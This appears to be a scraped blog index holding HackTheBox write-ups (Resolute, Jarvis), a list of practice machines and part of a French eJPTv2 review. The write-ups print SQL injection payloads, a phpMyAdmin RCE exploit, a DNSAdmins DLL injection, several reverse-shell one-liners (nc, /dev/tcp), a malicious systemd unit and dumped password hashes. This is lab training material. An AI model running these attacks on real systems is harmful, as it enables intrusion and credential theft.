6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt so download the file localy and lets analyse it localy.\nIts looks like a powershell command history and bimgo in this script we find the password of domain user ryan\nPS\u0026gt;CommandInvocation(Invoke-Expression): \u0026#34;Invoke-Expression\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Invoke-Expression): name=\u0026#34;Command\u0026#34;; value=\u0026#34;cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;Stream\u0026#34;; value=\u0026#34;True\u0026#34; lets valid the credential with cme.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) CME see ryan is admin, lets try to dump some hashes.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; --sam SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) SMB 10.10.10.169 445 RESOLUTE [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied but we can not do this, we need to exploit DNSadmin group.\nRyan to Domain Admin : # use evil-winrm to auth with ryan.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; First we need to create a malicious DLL with msfvenom. that we will be injecting into a dns.exe process on a victim DNS server (DC).\nmsfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.10.14.9 LPORT=1337 \u0026gt; dns.dll now use this command to tell to DC to load my dll when the service start.\n\u0026gt; dnscmd.exe RESOLUTE /config /serverlevelplugindll \\\\10.10.14.9\\share\\dns.dll If we have change succefully registry value ServerLevelPluginDll points to our malicious DLL :\n\u0026gt; Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Now stop and restart the service to get the SYSTEM SHELL.\n# start listener \u0026gt; nc -lvp 1337 # start smbserver \u0026gt; impacket-smbserver share . # start and stop dns service \u0026gt; sc.exe stop dns \u0026gt; sc.exe start dns We get the shell, we can now add ryan to group administrators and dump domain hashes\n\u0026gt; net localgroup Administrators ryan /add dump hash.\n\u0026gt; secretsdump megabank.local/ryan:\u0026#39;Serv3r4Admin4cc123!\u0026#39;@10.10.10.169 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a9276d51927d3cd34a8ac69ae39c40::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: megabank.local\\ryan:1105:aad3b435b51404eeaad3b435b51404ee:3f653cb103e005246bc95ceb2f56e30b::: megabank.local\\marko:1111:aad3b435b51404eeaad3b435b51404ee:8276510304cefe6e77c3a9e910ba3a6a::: megabank.local\\sunita:6601:aad3b435b51404eeaad3b435b51404ee:4e67de165ebd5e604d6580b15cfc61b2::: megabank.local\\abigail:6602:aad3b435b51404eeaad3b435b51404ee:3f67ccb851b02ac4ee9f91eeddf1cac7::: megabank.local\\marcus:6603:aad3b435b51404eeaad3b435b51404ee:d546df40747f48ece7e2be7349ec8f1b::: megabank.local\\sally:6604:aad3b435b51404eeaad3b435b51404ee:9d5a37664c09e08e8be59ca3e76c262f::: megabank.local\\fred:6605:aad3b435b51404eeaad3b435b51404ee:7be0fca1b4aec94356b86e4b1de06c4f::: megabank.local\\angela:6606:aad3b435b51404eeaad3b435b51404ee:07fe48603fa7ada83e62d14e54f45127::: megabank.local\\felicia:6607:aad3b435b51404eeaad3b435b51404ee:74dce6edc0eabd905d42e0a7225b80f3::: megabank.local\\gustavo:6608:aad3b435b51404eeaad3b435b51404ee:0b03061f9b79bf6642fe92aee0a109c6::: megabank.local\\ulf:6609:aad3b435b51404eeaad3b435b51404ee:f3dfd5c45de7a953c82fbe99749057c2::: megabank.local\\stevie:6610:aad3b435b51404eeaad3b435b51404ee:eb41b7464f302e573aaa697d191b5569::: megabank.local\\claire:6611:aad3b435b51404eeaad3b435b51404ee:72dc9d1d791307cf5217c8e39a88f56a::: megabank.local\\paulo:6612:aad3b435b51404eeaad3b435b51404ee:4e2d8cc79e15e601c099170a645483e6::: megabank.local\\steve:6613:aad3b435b51404eeaad3b435b51404ee:b8de802a1e7862c6e0e19be9c2baff0f::: megabank.local\\annette:6614:aad3b435b51404eeaad3b435b51404ee:2f9b8f25ec94dd46ecb071c27dc82905::: megabank.local\\annika:6615:aad3b435b51404eeaad3b435b51404ee:5d7226ebae151a224ada8add01bdc21c::: megabank.local\\per:6616:aad3b435b51404eeaad3b435b51404ee:b66616eb72209b81edded1fe63ae8806::: megabank.local\\claude:6617:aad3b435b51404eeaad3b435b51404ee:f059af81cb6022dc5de6389d4a6e6a65::: megabank.local\\melanie:10101:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2::: megabank.local\\zach:10102:aad3b435b51404eeaad3b435b51404ee:434927d08ddb971a8b14e407a58f6e9e::: megabank.local\\simon:10103:aad3b435b51404eeaad3b435b51404ee:25bc108c637a551f8b000054ea8ddc6e::: megabank.local\\naoki:10104:aad3b435b51404eeaad3b435b51404ee:07a1070c03b1a26e53d265d27ecb1a38::: RESOLUTE$:1000:aad3b435b51404eeaad3b435b51404ee:bd0c6f595fb4c21bab7d150c487183ed::: MS02$:1104:aad3b435b51404eeaad3b435b51404ee:7b71dcfa93cf1f5d37d34497b632c890::: connect with admin hash and get the flag.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;administrator\u0026#39; -H fb3b106896cdaa8a08072775fbd9afe9 -x \u0026#39;more C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; Credits : # Escalate to DA from DNSAdmins :\nEscalating Privileges with DNSAdmins Group — Active Directory\nmalicious dll with msfvenom :\nMeterpreter shell as a 32 \u0026amp; 64 Bit DLL\n","date":"17 March 2024","externalUrl":null,"permalink":"/posts/resolute/","section":"Posts","summary":"Resolute - OSCP boxe # Scanning : # Nmap scan to see open ports and services :","title":"OSCP boxe - Resolute"},{"content":" HacktheBox TJ Null list : # Voici ma liste perso de machines HTB pour préparer l\u0026rsquo;OSCP, bien sur inspiré de la trés connus TJ Null lists.\nEasy Machines : # Sense - Linux https://app.hackthebox.com/machines/Sense Valentine - Linux https://app.hackthebox.com/machines/Valentine Networked - Linux https://app.hackthebox.com/machines/Networked Swag Shop - Linux https://app.hackthebox.com/machines/SwagShop BountyHunter - Linux https://app.hackthebox.com/machines/BountyHunter Irked - Linux https://app.hackthebox.com/machines/Irked Tabby - Linux https://app.hackthebox.com/machines/Tabby Optimum - Windows https://app.hackthebox.com/machines/Optimum Artic - Windows https://app.hackthebox.com/machines/Arctic Bounty - Windows https://app.hackthebox.com/machines/Bounty Jerry - Windows https://app.hackthebox.com/machines/Jerry Mirai - Linux https://app.hackthebox.com/machines/194 Medium Machines : # Jarvis - Linux https://app.hackthebox.com/machines/Jarvis Magic - Linux https://app.hackthebox.com/machines/Magic TarTarSauce - Linux https://app.hackthebox.com/machines/TartarSauce Node - Linux https://app.hackthebox.com/machines/Node Cronos - Linux https://app.hackthebox.com/machines/Cronos Bastrard - Windows https://app.hackthebox.com/machines/Bastard Silo - Windows https://app.hackthebox.com/machines/Silo Chatterbox - Windows https://app.hackthebox.com/machines/Chatterbox Resolute - Windows https://app.hackthebox.com/machines/Resolute Hard Machines : # Kotarak - Linux https://app.hackthebox.com/machines/Kotarak Control - Windows https://app.hackthebox.com/machines/218 ","date":"16 March 2024","externalUrl":null,"permalink":"/posts/my-first-post/","section":"Posts","summary":"HacktheBox TJ Null list : # Voici ma liste perso de machines HTB pour préparer l\u0026rsquo;OSCP, bien sur inspiré de la trés connus TJ Null lists.","title":"TJ Null List"},{"content":"","date":"11 March 2024","externalUrl":null,"permalink":"/tags/command-injection/","section":"Tags","summary":"","title":"Command Injection"},{"content":" Jarvis - OSCP boxe # Scanning : # Lets use nmap to see open ports and services behind the ports :\n\u0026gt; nmap -sV -sC -T4 -sS 10.10.10.143 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8💿c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Scan all ports :\n\u0026gt; nmap --max-retries 1 -n -T5 -Pn 10.10.10.143 22/tcp open ssh 80/tcp open http Enumeration : # Lets run gobuster to brute force the hidden directory of the web server.\n\u0026gt; gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50 /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] /server-status (Status: 403) [Size: 277] Lets use Whatweb to find some informations about the frontend and the backend of the web site.\n\u0026gt; whatweb -a 3 http://10.10.10.143 http://10.10.10.143 [200 OK] Apache[2.4.25], Bootstrap[3.3.5], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE=edge] We found a domain and an email adress lets add the hostname to the /etc/hosts file.\necho \u0026#34;10.10.10.143 logger.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Whatweb have detected an Uncommon header ironwaf , maybe a waf is up on this web site lets try to detect what is it.\n\u0026gt; wafw00f http://10.10.10.143 ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\u0026#34; _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.2.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking http://10.10.10.143 [+] Generic Detection results: [-] No WAF detected by the generic detection [~] Number of requests: 7 Exploiting SQLI : # I found this page with a parameter named cod.\nI try to put some sqli but that dosent works so i try with sqlmap.\n\u0026gt; sqlmap -u http://10.10.10.143/room.php?cod=* --level 5 --risk 3 the result of sqlmap is positive the cod parameter is vulnerable to sqli.\nsqlmap identified the following injection point(s) with a total of 264 HTTP(s) requests: --- Parameter: #1* (URI) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: http://10.10.10.143/room.php?cod=-4966 OR 4374=4374 Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 time-based blind - Parameter replace Payload: http://10.10.10.143/room.php?cod=(CASE WHEN (4223=4223) THEN SLEEP(5) ELSE 4223 END) Type: UNION query Title: Generic UNION query (random number) - 7 columns Payload: http://10.10.10.143/room.php?cod=-8998 UNION ALL SELECT 5730,5730,5730,CONCAT(0x7178707071,0x63667a7662754c637353594274754f62514a5358786a4f6b4f6c4a6b755155426547634a714a6a53,0x717a7a6271),5730,5730,5730-- - Lets try to exploit this vuln without sqlmap.\nI see that sqlmap tells us that we can make a sqli based on the union I try it because I’m really bad at sqli. So frist we need to found who many colomn have the table.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,4,5,6,7-- -+ We found the tables have 7 columns we can now for exemple dump the db version.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,4,@@version,6,7-- -+ Lets try to get informations about the databases.\n\u0026gt; ?cod=13 UNION SELECT 1,2,(select group_concat(schema_name)from INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 -- -+ # or see the current database 13 UNION SELECT 1,2,3,4,database(),6,7-- -+ Lets get enumerate table in databases.\n\u0026gt; ?cod=13 UNION SELECT 1,2,table_name,4,table_schema,6,7 from INFORMATION_SCHEMA.TABLES order by 3-- -+ The account tables may contain some identification information, so let’s try to get information on it.\n\u0026gt; ?cod=13 UNION SELECT 1,2,(select group_concat(column_name)),4,5,6,7 from INFORMATION_SCHEMA.COLUMNS-- -+ But After lot of search it was not the right way. If I list my current user of the db I realize that I am dbadmin on the mysql service\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,user(),5,6,7 -- - + Lets try to read some file to get LFI from sqli because i think my user have right to do.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,(LOAD_FILE(\u0026#34;/etc/passwd\u0026#34;)),5,6,7 -- - When I try to read php code the application return nothing, it is probably a code of certain tags in php code, tried to encode the output in b64 to get some result.\n\u0026gt; ?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE(\u0026#34;/var/www/html/room.php\u0026#34;))),5,6,7 -- -+ So a run a new gobuster brute force but this time I try to find some php file.\n\u0026gt; gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t50 -x php /nav.php (Status: 200) [Size: 1333] /footer.php (Status: 200) [Size: 2237] /.php (Status: 403) [Size: 277] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /index.php (Status: 200) [Size: 23628] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /connection.php (Status: 200) [Size: 0] /room.php (Status: 302) [Size: 3024] [--\u0026gt; index.php] /.php (Status: 403) [Size: 277] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] /server-status (Status: 403) [Size: 277] Lets try to get the php code of connection.php\n?cod=13 UNION SELECT 1,2,3,(TO_base64(LOAD_FILE(\u0026#34;/var/www/html/connection.php\u0026#34;))),5,6,7 -- -+ Decode the b64.\nPD9waHAKJGNvbm5lY3Rpb249bmV3IG15c3FsaSgnMTI3LjAuMC4xJywnREJhZG1pbicsJ2ltaXNz eW91JywnaG90ZWwnKTsKPz4K # decode form \u0026lt;?php $connection=new mysqli(\u0026#39;127.0.0.1\u0026#39;,\u0026#39;DBadmin\u0026#39;,\u0026#39;imissyou\u0026#39;,\u0026#39;hotel\u0026#39;);?\u0026gt; With this credential we log in to phpmyadmin page.\nGet RCE on PhpMyAdmin : # After a quick search I find the version a phpmyadmin it is 4.8.0 so I search some know vulnerabilities on this version and I found this exploit db exploit.\nphpMyAdmin 4.8.1 - Remote Code Execution (RCE)\nSo download it using searchsploit.\n\u0026gt; searchsploit -m 50457.py Launch the exploit and get RCE.\n\u0026gt; python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou id uid=33(www-data) gid=33(www-data) groups=33(www-data) Get reverse shell.\n\u0026gt; python 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.9 1234 \u0026gt;/tmp/f\u0026#39; Privileges Escalation www-data ⇒ pepper : # I run a linpeas on the target and i find this priv esc way.\nThe binary systemctl is configured to suid we can easly exploit this but we do not have the right to execute this binary.\n\u0026gt; ls -l /bin/systemctl -rwsr-x--- 1 root pepper 174520 Jun 29 2022 /bin/systemctl Enumerate sudo right of the user.\n\u0026gt; sudo -l User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py lets see what is this python script. On this on fonction is interresting.\ndef exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;|\u0026#39;] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print(\u0026#39;Got you\u0026#39;) exit() os.system(\u0026#39;ping \u0026#39; + command) As you can see this fonction take an input from the user, it attents an ip, to try to secure the thing the creator has added a filter that will browse the string send to user if the one if contains separators commands bash then we do not pass the filter.\nI try to find some payload and cheat sheet.\nHacker\u0026rsquo;s Guide\nIn this cheat sheet I see that it is possible to force a command execution with the following syntax $(command) .\n\u0026gt; sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Enter an IP: $(id) #result ping: groups=1000(pepper): Temporary failure in name resolution This work we get the output succefully, now get reverse shell.\n#Create a file with bash reverse shell payload #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.9/4444 0\u0026gt;\u0026amp;1 # give it the exec right \u0026gt; chmod +x shell.sh # launch rce \u0026gt; sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Enter an IP: $(bash /tmp/shell.sh) We can now exploit the SUID binary systemctl is real simple, to start create a file named shell.service.\ntouch shell.service # paste that in there, juste change the ip adresse [Unit] Description=roooooooooot [Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.9/9999 0\u0026gt;\u0026amp;1\u0026#39; [Install] WantedBy=multi-user.target Uplaod this file on the target on the /home/pepper directory and enable the new malicious service.\n\u0026gt; /bin/systemctl enable /home/pepper/shell.service Now start the service do not forget to your nc listener.\n\u0026gt; nc -lnvp 9999 # start malicious service \u0026gt; /bin/systemctl start shell GG ! Realy nice boxe i love exploit SQLI and understand what I\u0026rsquo;m doing 😆.\n","date":"11 March 2024","externalUrl":null,"permalink":"/posts/jarvis/","section":"Posts","summary":"Jarvis - OSCP boxe # Scanning : # Lets use nmap to see open ports and services behind the ports :","title":"OSCP boxe - Jarvis"},{"content":"","date":"11 March 2024","externalUrl":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLI"},{"content":" eJPTv2 Review FR # cette review est en quatre parties # Les cours et le PATH\nComment préparer l\u0026rsquo;exam hors cours de l\u0026rsquo;INE\nL\u0026rsquo;examen\nCe qui manque à la certification\nLes cours et Le PATH # Après votre paiement, vous obtiendrez l\u0026rsquo;acces au PATH \u0026lsquo;Penetration Tester student\u0026rsquo; de l\u0026rsquo;INE. Les cours sont dirigés par Josh Mason, mais principalement enseignés par Alexi Hamed, également connu sous le nom de @Hackersploit. Le parcours dure 148 heures et est très complet. Vous aborderez tous les aspects fondamentaux du pentesting à travers des vidéos explicatives, suivies de travaux pratiques dans un laboratoire pour mettre en pratique ce que vous venez d\u0026rsquo;apprendre. Vous disposerez d\u0026rsquo;un fichier PDF pour chaque laboratoire, afin de prendre des notes. Personnellement, j\u0026rsquo;ai enregistré toutes mes notes dans une base de données personnelle, car c\u0026rsquo;est ma méthode de travail. Je recommande l\u0026rsquo;utilisation de l\u0026rsquo;outil Notion pour ce type de prise de notes.\nComme mentionné précédemment, le contenu des cours est très complet. Vous commencerez par une section sur les technologies d\u0026rsquo;évaluation, qui, pour être honnete n\u0026rsquo;a pas été faite en entier. Le module sur la « Information Gathering » est particulièrement intéressant, car il traite de toutes les méthodes de recherche sur des sources ouvertes pour obtenir des informations sur votre cible via internet (animé par Hackersploit).\nLa section la plus captivante est la troisième, intitulée «Host \u0026amp; Network Penetration Testing». Cette section à elle seule pourrait suffire pour réussir l\u0026rsquo;examen. Vous y apprendrez à comprendre et à utiliser le framework Metasploit, qui occupe une place centrale dans cette certification. Vous passerez en revue tous les aspects d\u0026rsquo;un test de pénétration, notamment le scan actif via nmap et ses divers scripts (NSE), l\u0026rsquo;énumération des services réseau tels que smb, ssh, ftp, rdp, mysql, apache, smtp, et j\u0026rsquo;en oublie sûrement. Vous apprendrez ensuite comment exploiter ces vulnérabilités pour accéder à une machine ou à un serveur après les avoir identifiées. Dans la même veine, il y a une section consacrée à la post-exploitation, qui inclut l\u0026rsquo;énumération et les élévations de privilèges sous Linux et Windows, diverses techniques de persistance, du pivotage avec Meterpreter, ainsi qu\u0026rsquo;une petite partie sur l\u0026rsquo;effacement des traces. Vous serez également initié à des attaques telles que l\u0026rsquo;empoisonnement ARP et les attaques WiFi. En ce qui concerne l\u0026rsquo;exploitation web, le parcours part vraiment de zéro, alors prenez des notes détaillées sur les attaques par force brute sur les formulaires de connexion http-post avec l\u0026rsquo;outil Hydra, car cela peut s\u0026rsquo;avérer utile lors de l\u0026rsquo;examen. En réalité, cette certification ne se penche que très rarement, voire jamais, sur l\u0026rsquo;exploitation manuelle des vulnérabilités, ce qui est dommage, car parfois, vous pouvez exploiter une vulnérabilité sans vraiment comprendre pourquoi vous avez obtenu une exécution de code à distance (RCE).\nEn ce qui concerne la difficulté des cours, ils restent au niveau très basique du pentesting. Cependant, je recommande tout de même d\u0026rsquo;avoir une connaissance préalable de l\u0026rsquo;utilisation du terminal, de l\u0026rsquo;environnement Linux et des bases solides en réseautique. Avant de suivre cette certification, j\u0026rsquo;avais travaillé sur TryHackMe, en particulier le parcours Junior Penetration Tester. Je ne peux que vous conseiller de faire ce parcours au préalable.\nLa majeure partie des cours est dispensée par Hackersploit, et c\u0026rsquo;est vraiment un plaisir de suivre ses enseignements. Personnellement, j\u0026rsquo;ai des difficultés avec l\u0026rsquo;anglais, surtout lorsque les gens parlent rapidement. J\u0026rsquo;avais donc un peu peur de manquer des informations, mais Hackersploit parle anglais de manière posée, ce qui m\u0026rsquo;a beaucoup aidé. Grâce à lui, j\u0026rsquo;ai même progressé en anglais. Pour vous donner une idée, j\u0026rsquo;ai commencé à regarder les vidéos avec des sous-titres en anglais, mais vers le milieu du parcours, je n\u0026rsquo;en avais plus besoin, tant le niveau d\u0026rsquo;anglais de Hackersploit est agréable. En ce qui concerne les explications techniques, elles sont également très claires. Hackersploit explique tout ce qu\u0026rsquo;il fait et ne va pas trop vite.\nPréparation Complémentaire avec CTF et Machines Pratiques # Je suis convaincu que les cours fournissent une base solide pour l\u0026rsquo;examen, cependant, pour renforcer mes compétences, j\u0026rsquo;ai choisi d\u0026rsquo;aller au-delà et de m\u0026rsquo;engager dans divers CTF en parallèle avec le parcours. Cette approche a grandement contribué à ma réussite à l\u0026rsquo;examen. Je m\u0026rsquo;étais déjà intéressé aux CTF avant de commencer la certification. Étant donné le manque d\u0026rsquo;accent mis sur l\u0026rsquo;exploitation manuelle dans le parcours, j\u0026rsquo;ai consacré beaucoup de temps à relever des défis sur RootMe. Cela m\u0026rsquo;a poussé à exploiter des vulnérabilités de manière manuelle et à mettre en pratique le principe « Lisez le foutu manuel ».\nPendant la dernière semaine précédant l\u0026rsquo;examen, j\u0026rsquo;ai concentré mes efforts sur les challenges Boot2Root de TryHackMe et HackTheBox. Cela a été rendu possible grâce à l\u0026rsquo;accès gratuit temporaire à des machines retirées, qui s\u0026rsquo;est avéré très enrichissant. Je recommande de résoudre les machines suivantes avant l\u0026rsquo;examen :\nTryHackMe : # Basic Pentesting Relevant Daily Bugle Ice Blue Skynet Tomghost Brute It GamingServer Anonymous Blog 0day Alfred Steel Mountain Hackparc HackTheBox : # Timelapse Devel MonitorsTwo Pilgrimage VulnHub : # DerpNstink Stapler 1 My Web Server Expérience de l\u0026rsquo;Examen de Certification # L\u0026rsquo;environnement de l\u0026rsquo;examen est basé sur Guacamole. Mon environnement était stable, mais il y a des contraintes à considérer. Par exemple, j\u0026rsquo;ai voulu me connecter à un serveur via Evil-WinRM, mais l\u0026rsquo;outil n\u0026rsquo;était pas installé et l\u0026rsquo;environnement n\u0026rsquo;est pas connecté à Internet, ce qui signifie qu\u0026rsquo;il n\u0026rsquo;y avait pas de possibilité d\u0026rsquo;installer de paquets. Le manque d\u0026rsquo;accès VPN pour utiliser nos propres machines d\u0026rsquo;attaque a été une restriction, ce qui est dommage. J\u0026rsquo;ai ressenti des limitations dans mes choix d\u0026rsquo;attaques. Vous avez une marge de temps confortable, car vous disposez de 48 heures pour répondre aux questions, qui parfois vous aident à progresser dans le laboratoire.\nLe contexte de l\u0026rsquo;examen est le suivant : vous vous trouvez dans une DMZ avec plusieurs hôtes à l\u0026rsquo;intérieur. Vous devez trouver un moyen d\u0026rsquo;accéder à plusieurs d\u0026rsquo;entre eux (dans mon cas, il s\u0026rsquo;agissait de 4 serveurs, dont 3 Windows et 1 Linux). En utilisant l\u0026rsquo;un de ces serveurs, vous devez établir une connexion avec Meterpreter pour pivoter sur un réseau interne (dans mon cas, un réseau Linux).\nEn vérité, la plupart des éléments de l\u0026rsquo;examen auraient pu être réalisés avec Metasploit, du moins une grande partie. Cependant, ce n\u0026rsquo;est pas toujours avantageux, car certains modules de Metasploit peuvent échouer, et vous ne pouvez pas toujours compter sur des preuves de concept depuis GitHub comme vous le feriez habituellement. Vous devez être capable de faire fonctionner vos modules. De plus, le fait de ne pas pouvoir copier-coller entre votre ordinateur hôte et l\u0026rsquo;environnement Guacamole ajoute une complexité. En ce qui concerne les vulnérabilités, la plupart d\u0026rsquo;entre elles étaient couvertes dans les cours, mais certaines ne l\u0026rsquo;étaient pas. C\u0026rsquo;est ici que l\u0026rsquo;expérience acquise lors des CTF m\u0026rsquo;a été d\u0026rsquo;une grande aide, car j\u0026rsquo;ai pu exploiter des vulnérabilités que je n\u0026rsquo;avais pas vues pendant le parcours.\nAu total, j\u0026rsquo;ai passé 7 heures pour l\u0026rsquo;examen et j\u0026rsquo;ai obtenu la certification avec un score de 91% (le seuil de réussite est de 70%).\nMes conseils sont simples\u0026hellip; Brute forcer moi ces services xD ! Plus sérieusement, l\u0026rsquo;examen se rapproche davantage de la réalité (du moins je le pense, n\u0026rsquo;ayant jamais fait de missions de pentesting). Ce n\u0026rsquo;est pas un CTF. Suivez bien votre méthodologie, prenez le temps de scanner minutieusement votre cible à l\u0026rsquo;aide de scripts Nmap pour obtenir autant d\u0026rsquo;informations que possible. Prenez des notes sur vos résultats, car il y a de nombreux hôtes à exploiter, et vous pourriez vous perdre dans les informations.\nEn ce qui concerne le pivoting, assurez-vous de repérer le point de pivot en consultant les cartes réseau à l\u0026rsquo;aide d\u0026rsquo;une commande comme ifconfig (dans le cas de Meterpreter). Il y aura forcément un point de pivot, ne le manquez pas. Essayez de tirer parti de Metasploit autant que possible, car les questions peuvent souvent tourner autour de Metasploit, ce qui vous aidera à répondre.\nEn termes de post-exploitation, n\u0026rsquo;oubliez pas de mettre en place de la persistance. Cela peut sembler évident, mais cela peut vous faire gagner du temps. J\u0026rsquo;ai personnellement gagné du temps en fermant mon navigateur Firefox qui chargeait un reverse shell. Heureusement, grâce à la persistance, je n\u0026rsquo;ai pas eu à refaire toute l\u0026rsquo;exploitation. Pour l\u0026rsquo;élévation des privilèges sur les hôtes Windows, dans mon cas je n\u0026rsquo;ai pas eu a élévers mes privilges, mais pour le système Linux, j\u0026rsquo;ai du passer par pluseiure phase d\u0026rsquo;élévation. N\u0026rsquo;oubliez pas de réutiliser les mots de passe que vous avez trouvés pour vous connecter en tant qu\u0026rsquo;utilisateur local.\nPour finir, utilisez les questions fournies comme des indices. À un moment donné, j\u0026rsquo;étais bloqué dans ma recherche du point de pivot, mais une question m\u0026rsquo;a orienté vers la vulnérabilité à exploiter, ce qui m\u0026rsquo;a permis de progresser.\nLacune dans la Certification # Une lacune notable dans la certification réside dans l\u0026rsquo;absence d\u0026rsquo;une section consacrée au reporting. Je suis d\u0026rsquo;avis que le pentest ne se limite pas seulement à l\u0026rsquo;exploitation, mais également à la communication des résultats. Un rapport de pentest revêt une importance capitale, car il documente les vulnérabilités découvertes, les méthodes utilisées pour les exploiter, ainsi que les recommandations pour les résoudre. Il constitue une preuve concrète du travail accompli et de la valeur ajoutée en matière de sécurité.\nDans le contexte professionnel, les clients et les employeurs attendent généralement un rapport détaillé exposant clairement les problèmes de sécurité identifiés, ainsi que les mesures correctives suggérées. Un rapport bien structuré facilite la compréhension des enjeux et permet de prendre des décisions éclairées pour renforcer la posture de sécurité.\nL\u0026rsquo;intégration d\u0026rsquo;une section dédiée au reporting dans la certification offrirait aux apprenants l\u0026rsquo;occasion de se familiariser avec la rédaction de rapports de pentest, un aspect fondamental de la profession de pentester dans la vie réelle. Cette inclusion pourrait également renforcer la compréhension de l\u0026rsquo;importance de la communication claire et concise des résultats de sécurité.\nMot de Fin # La préparation à la 